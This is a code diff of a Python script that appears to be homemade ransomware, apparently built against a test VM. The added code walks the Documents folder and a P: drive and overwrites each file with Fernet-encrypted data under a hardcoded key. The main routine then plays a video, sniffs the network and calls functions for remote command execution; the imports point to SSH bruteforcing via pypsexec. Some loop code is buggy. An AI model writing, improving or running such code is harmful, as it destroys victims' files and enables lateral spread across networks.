@@ -6,42 +6,43 @@ import time #Bruteforcing SSH connection
 from pypsexec.client import Client #Sending remote commands
 
 
-    
-#def encrypt file
-def ransom():
-    key = "_TjtaRpjApz2rBn4m22iqH6x3wo_3iDE99HQwKwKt4o="
-    f = Fernet(key)
-    with open(filename, "rb") as file:
-    # read all file data
-        file_data = file.read()
-    # encrypt data
-    encrypting_data = f.encrypt(file_data)
-    #Write over the existing file
-    with open(filename, "wb") as file:
-        file.write(encrypting_data)
 
 #Walkthrough the Documents folder and the P: drive
 def fileWalk():
-    for (root, dirs, files) in os.walk(start_path, topdown = False):
-                for name in files:
-                    path = os.path.join(root, name)
-            if (path[-4:] == ".txt"):
-                try:
-                    encrypt_file(path, key)
-                except:
-                    pass
-            elif (path[-4:] == ".doc"):
-                encrypt_file(path, key)
-            if (path[-4:] == ".pdf"):
-                encrypt_file(path, key)
-            elif (path[-5:] == ".docx"):
-                encrypt_file(path, key)
+    path= "C:\\Users\\IEUsers\\Documents"
+    files=[]
+    for r,f in os.walk(path):
+        for file in f:
+            files.append(os.path.join(r,file))
+        for f in files:
+            encrypt(f)
+    fileWalkP()
+
+def fileWalkP():
+    path= "P:\\"
+    files=[]
+    for r,f in os.walk(path):
+        for file in f:
+            files.append(os.path.join(r,file))
+        for f in files:
+            encrypt(f)
+
+
+#def encrypt file
+def encrypt(fileLocation):
+    key = "_TjtaRpjApz2rBn4m22iqH6x3wo_3iDE99HQwKwKt4o="
+    f = Fernet(key)
+    with open(fileLocation, "rb") as file:
+        file_data=file.read()
+    encrypt_data=f.encrypt(file_data)
+    with open (fileLocation, "wb") as file:
+        file.write(encrypt_data)
+
 
 #play video
 def playVideo():
     os.system("cd C:\\Users\\IEUser\\Downloads")
     #CHANGE BACKGROUD
-
 
 
 # sniff network 
@@ -82,7 +83,7 @@ def remoteExecute(ipAddress, user, password):
 
 def main():
     user= "IEUser"
-    ransom()
+    fileWalk()
     playVideo()
     ipAddress= sniffNetwork()
     print(ipAddress)
